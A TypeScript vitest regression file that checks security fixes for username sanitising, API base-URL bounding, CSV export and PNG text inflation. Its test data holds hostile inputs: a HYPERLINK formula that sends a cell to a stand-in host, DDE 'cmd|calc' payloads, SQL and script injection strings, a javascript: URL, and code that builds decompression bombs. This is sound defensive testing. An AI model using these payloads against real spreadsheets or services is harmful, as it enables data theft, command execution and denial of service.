import { deflateSync } from "node:zlib";
import { describe, expect, it } from "vitest";
import { sanitizeUsername } from "../src/lib/utils";
import { safeBaseUrl, PROVIDER_PRESETS } from "../src/lib/capytools/llm";
import { toCsv } from "../src/lib/capyexpense/csv";
import { readPngText } from "../src/lib/capystrip/png";
import type { Transaction } from "../src/lib/capyexpense/types";

/**
 * Regression tests for a security review (Sep 2026). Each one fails if a
 * specific hardening fix is reverted, so they are grouped rather than filed
 * under the feature they sit in — one file to run when you want to know the
 * guards are still there.
 */

describe("sanitizeUsername rejects what cannot be a GitHub login", () => {
  it("keeps real logins, including the URL and @ forms", () => {
    expect(sanitizeUsername("torvalds")).toBe("torvalds");
    expect(sanitizeUsername("@torvalds")).toBe("torvalds");
    expect(sanitizeUsername("https://github.com/torvalds")).toBe("torvalds");
    expect(sanitizeUsername("github.com/torvalds/some-repo")).toBe("torvalds");
    expect(sanitizeUsername("a-b-c")).toBe("a-b-c");
    expect(sanitizeUsername("a".repeat(39))).toBe("a".repeat(39));
  });

  it.each([
    ["empty", ""],
    ["dot-dot", ".."],
    ["a space", "hello world"],
    ["markup", "<script>x</script>"],
    ["a quote", "'; DROP--"],
    ["non-ascii", "café"],
    ["a leading hyphen", "-lead"],
    ["a trailing hyphen", "trail-"],
    ["40 characters", "a".repeat(40)],
    // The one that made the unauthenticated fan-out worth paying for: an
    // unbounded name is an unbounded cache key.
    ["5,000 characters", "a".repeat(5000)],
  ])("rejects %s", (_label, input) => {
    expect(sanitizeUsername(input)).toBe("");
  });
});

describe("safeBaseUrl bounds where the API key may be sent", () => {
  const fallback = PROVIDER_PRESETS.opencode.defaultBaseUrl;

  it("allows https anywhere, and http only on loopback", () => {
    expect(safeBaseUrl("https://openrouter.ai/api/v1", fallback)).toBe(
      "https://openrouter.ai/api/v1",
    );
    // The `custom` preset legitimately ships a local Ollama default.
    expect(safeBaseUrl("http://localhost:11434/v1", fallback)).toBe("http://localhost:11434/v1");
    expect(safeBaseUrl("http://127.0.0.1:11434/v1", fallback)).toBe("http://127.0.0.1:11434/v1");
  });

  it.each([
    ["cleartext to a remote host", "http://evil.tld/v1"],
    ["a non-URL", "not a url"],
    ["a javascript: url", "javascript:alert(1)"],
    ["a data: url", "data:text/plain,x"],
    ["the wrong type", 42],
    ["nothing at all", undefined],
  ])("falls back to the provider default for %s", (_label, input) => {
    expect(safeBaseUrl(input, fallback)).toBe(fallback);
  });
});

describe("CSV export neutralises formulas without mangling numbers", () => {
  const tx = (over: Partial<Transaction>): Transaction => ({
    id: "f#Sep#2",
    date: "2026-09-01",
    category: "food",
    type: "expense",
    kind: "out",
    amount: 12.5,
    note: "",
    paymentMethod: "cash",
    account: null,
    needWant: "want",
    interval: null,
    currency: "GBP",
    source: { file: "f", sheet: "Sep", row: 2 },
    extra: {},
    ...over,
  } as Transaction);

  it("quotes a leading = so Excel cannot evaluate it", () => {
    const csv = toCsv([tx({ note: '=HYPERLINK("https://x/?d="&A1,"Open")' })]);
    expect(csv).toContain(`'=HYPERLINK`);
    // The raw formula must never appear at the start of a field.
    expect(csv).not.toMatch(/(^|,)=HYPERLINK/m);
  });

  it.each(["=1+1", "+1", "-2+3+cmd|'/c calc'!A0", "@SUM(A1)"])(
    "neutralises a note starting %s",
    (note) => {
      expect(toCsv([tx({ note })])).toContain(`'${note.split(",")[0]}`);
    },
  );

  it("neutralises a user-supplied COLUMN NAME too", () => {
    const csv = toCsv([tx({ extra: { "=cmd|'/c calc'!A0": "x" } })]);
    expect(csv).not.toMatch(/(^|,)=cmd/m);
  });

  it("leaves ordinary text and bare numbers alone", () => {
    const csv = toCsv([tx({ note: "lunch", extra: { Balance: "-12.50" } })]);
    expect(csv).toContain("lunch");
    // A negative number in a user's own column must stay a number.
    expect(csv).toContain("-12.50");
    expect(csv).not.toContain("'-12.50");
  });
});

describe("PNG text inflation is bounded", () => {
  /** Minimal PNG: signature + one chunk. The walker does not verify CRCs. */
  function pngWith(type: string, data: Uint8Array): Uint8Array {
    const out = [0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a];
    const len = data.length;
    out.push((len >>> 24) & 255, (len >>> 16) & 255, (len >>> 8) & 255, len & 255);
    for (const ch of type) out.push(ch.charCodeAt(0));
    out.push(...data);
    out.push(0, 0, 0, 0); // CRC placeholder
    return new Uint8Array(out);
  }

  const hasStreams = typeof DecompressionStream !== "undefined";

  it.skipIf(!hasStreams)("reads a normal zTXt chunk", async () => {
    const body = Buffer.concat([
      Buffer.from("parameters\0\0", "latin1"),
      deflateSync(Buffer.from("a calm little prompt", "utf8")),
    ]);
    const chunks = await readPngText(pngWith("zTXt", new Uint8Array(body)));
    expect(chunks[0].value).toBe("a calm little prompt");
  });

  it.skipIf(!hasStreams)("refuses a decompression bomb instead of buffering it", async () => {
    // 64MB of zeros deflates to a few KB. Before the cap this expanded into a
    // single string via Response.text(); an OOM abort is not catchable, so the
    // try/catch around it never fired and the tab simply died.
    const bomb = deflateSync(Buffer.alloc(64 * 1024 * 1024));
    expect(bomb.length).toBeLessThan(200_000);

    const body = Buffer.concat([Buffer.from("parameters\0\0", "latin1"), bomb]);
    const chunks = await readPngText(pngWith("zTXt", new Uint8Array(body)));

    expect(chunks).toHaveLength(1);
    expect(chunks[0].value).toContain("too large");
    // The whole point: nothing near 64MB was ever held.
    expect(chunks[0].value.length).toBeLessThan(500);
  });

  it.skipIf(!hasStreams)("charges an over-limit chunk the whole file budget", async () => {
    // The budget is per FILE. A bomb that trips the ceiling must exhaust it,
    // or a PNG carrying hundreds of small bombs pays 4MB of inflation each
    // time: 500 chunks measured 4.3s before this, 0.24s after.
    const bomb = deflateSync(Buffer.alloc(5 * 1024 * 1024));
    const body = new Uint8Array(
      Buffer.concat([Buffer.from("parameters\0\0", "latin1"), bomb]),
    );
    const out = [0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a];
    for (let i = 0; i < 200; i += 1) {
      const len = body.length;
      out.push((len >>> 24) & 255, (len >>> 16) & 255, (len >>> 8) & 255, len & 255);
      for (const ch of "zTXt") out.push(ch.charCodeAt(0));
      out.push(...body, 0, 0, 0, 0);
    }

    const started = Date.now();
    const chunks = await readPngText(new Uint8Array(out));
    expect(chunks).toHaveLength(200);
    expect(Date.now() - started).toBeLessThan(2_000);
  });
});
